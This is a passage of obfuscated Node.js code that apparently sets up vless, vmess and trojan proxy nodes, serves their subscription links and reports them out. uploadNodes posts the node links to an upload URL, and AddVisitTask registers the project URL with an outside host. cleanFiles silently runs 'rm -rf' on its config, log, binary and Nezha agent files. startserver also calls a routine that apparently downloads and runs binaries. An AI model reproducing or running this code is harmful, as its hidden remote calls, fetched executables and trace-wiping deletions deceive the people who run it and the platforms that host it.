_0x5603ca=_0x307a,_0xde604a={'v':'2','ps':''+_0x2dce84,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x262858,'path':_0x5603ca(_0x4810ce._0x10970f),'tls':'tls','sni':_0x262858,'alpn':'','fp':_0x5603ca(0x196)},_0x184c15=_0x5603ca(_0x4810ce._0x756fd6)+UUID+'@'+CFIP+':'+CFPORT+_0x5603ca(_0x4810ce._0x3b0536)+_0x262858+'&fp=firefox&type=ws&host='+_0x262858+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x2dce84+_0x5603ca(_0x4810ce._0x35bc8e)+Buffer[_0x5603ca(0x14d)](JSON['stringify'](_0xde604a))['toString'](_0x5603ca(_0x4810ce._0x58a7b0))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x5603ca(_0x4810ce._0x61656f)+_0x262858+'&fp=firefox&type=ws&host='+_0x262858+_0x5603ca(_0x4810ce._0x3b51f5)+_0x2dce84+_0x5603ca(0x120);console['log'](Buffer[_0x5603ca(0x14d)](_0x184c15)[_0x5603ca(0x16d)](_0x5603ca(_0x4810ce._0x58a7b0))),fs[_0x5603ca(0x133)](subPath,Buffer['from'](_0x184c15)[_0x5603ca(_0x4810ce._0x5499b4)](_0x5603ca(0x163))),console[_0x5603ca(0x1ad)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app['get']('/'+SUB_PATH,(_0x48366b,_0x19f445)=>{const _0x3bf154=_0x5603ca,_0x567c8b=Buffer['from'](_0x184c15)[_0x3bf154(_0x10f4b0._0x5bd3ae)](_0x3bf154(0x163));_0x19f445[_0x3bf154(0x1a5)](_0x3bf154(_0x10f4b0._0x1ca2cc),_0x3bf154(0x164)),_0x19f445[_0x3bf154(0x139)](_0x567c8b);}),_0x501fb1(_0x184c15);},0x7d0);});}}async function uploadNodes(){const _0xe0fbbd={_0x1f7662:0x1ae,_0x1dcf51:0x166,_0xea5844:0x1ad,_0x462cb9:0x116,_0x26666a:0x1a9,_0x250379:0x12a,_0x1d2840:0x13b,_0x5d1656:0x14f,_0xda279:0x1a3,_0x57b7aa:0x168,_0x351e76:0x198,_0x21a0da:0x166},_0x239606=_0x20f892;if(UPLOAD_URL&&PROJECT_URL){const _0x388fa8=PROJECT_URL+'/'+SUB_PATH,_0x56b7a6={'subscription':[_0x388fa8]};try{const _0x1991cc=await axios['post'](UPLOAD_URL+_0x239606(_0xe0fbbd._0x1f7662),_0x56b7a6,{'headers':{'Content-Type':_0x239606(_0xe0fbbd._0x1dcf51)}});return _0x1991cc&&_0x1991cc['status']===0xc8?(console[_0x239606(_0xe0fbbd._0xea5844)](_0x239606(0x165)),_0x1991cc):null;}catch(_0x5137b0){if(_0x5137b0[_0x239606(0x116)]){if(_0x5137b0[_0x239606(_0xe0fbbd._0x462cb9)][_0x239606(_0xe0fbbd._0x26666a)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x239606(_0xe0fbbd._0x250379)](listPath))return;const _0x4b3f47=fs[_0x239606(_0xe0fbbd._0x1d2840)](listPath,_0x239606(_0xe0fbbd._0x5d1656)),_0xc1f0c8=_0x4b3f47[_0x239606(_0xe0fbbd._0xda279)]('\x0a')['filter'](_0x1fe48b=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x1fe48b));if(_0xc1f0c8[_0x239606(_0xe0fbbd._0x57b7aa)]===0x0)return;const _0x5145aa=JSON[_0x239606(_0xe0fbbd._0x351e76)]({'nodes':_0xc1f0c8});try{const _0x83a7ec=await axios[_0x239606(0x1bd)](UPLOAD_URL+'/api/add-nodes',_0x5145aa,{'headers':{'Content-Type':_0x239606(_0xe0fbbd._0x21a0da)}});return _0x83a7ec&&_0x83a7ec['status']===0xc8?(console['log']('Nodes\x20uploaded\x20successfully'),_0x83a7ec):null;}catch(_0x401f35){return null;}}else return;}}function _0x307a(_0x55fde6,_0x2f4b89){const _0x5ad2a0=_0x5ad2();return _0x307a=function(_0x307a19,_0x53d265){_0x307a19=_0x307a19-0x106;let _0x29a0bc=_0x5ad2a0[_0x307a19];return _0x29a0bc;},_0x307a(_0x55fde6,_0x2f4b89);}function cleanFiles(){const _0x5d847c={_0x27f391:0x17a,_0x5cc45b:0x169,_0x2de961:0x125,_0x404ba6:0x13e,_0x58a59a:0x13e},_0x27f144={_0x386238:0x11c,_0x305b54:0x1ad};setTimeout(()=>{const _0xe2bf83={_0x257b61:0x11c,_0x1d1a1c:0x1ad},_0x21a521=_0x307a,_0x267923=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x267923[_0x21a521(0x17a)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x267923[_0x21a521(_0x5d847c._0x27f391)](phpPath);process[_0x21a521(_0x5d847c._0x5cc45b)]===_0x21a521(0x131)?exec(_0x21a521(_0x5d847c._0x2de961)+_0x267923[_0x21a521(_0x5d847c._0x404ba6)]('\x20')+'\x20>\x20nul\x202>&1',_0x518834=>{const _0x227bf3=_0x21a521;console[_0x227bf3(_0x27f144._0x386238)](),console[_0x227bf3(0x1ad)](_0x227bf3(0x18e)),console[_0x227bf3(_0x27f144._0x305b54)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec('rm\x20-rf\x20'+_0x267923[_0x21a521(_0x5d847c._0x58a59a)]('\x20')+'\x20>/dev/null\x202>&1',_0x58e799=>{const _0x2c5739=_0x21a521;console[_0x2c5739(_0xe2bf83._0x257b61)](),console['log']('App\x20is\x20running'),console[_0x2c5739(_0xe2bf83._0x1d1a1c)](_0x2c5739(0x1c6));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2289b1={_0x2947f4:0x1bd,_0x3d9cd5:0x106,_0x42b3a9:0x144},_0x431702=_0x20f892;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x431702(0x1ad)](_0x431702(0x18b));return;}try{const _0x4f419f=await axios[_0x431702(_0x2289b1._0x2947f4)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x431702(0x166)}});return console[_0x431702(0x1ad)](_0x431702(0x17b)),_0x4f419f;}catch(_0x1f6785){return console['error'](_0x431702(_0x2289b1._0x3d9cd5)+_0x1f6785[_0x431702(_0x2289b1._0x42b3a9)]),null;}}async function startserver(){const _0x4dcba0=_0x20f892;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x262121){console['error'](_0x4dcba0(0x16c),_0x262121);}}startserver()[_0x20f892(0x19a)](_0x16cacd=>{const _0x11456c={_0x1b1fbc:0x17f},_0x5479a6=_0x20f892;console[_0x5479a6(0x18a)](_0x5479a6(_0x11456c._0x1b1fbc),_0x16cacd);}),app['listen'](PORT,()=>console['log'](_0x20f892(0x114)+PORT+'!'));
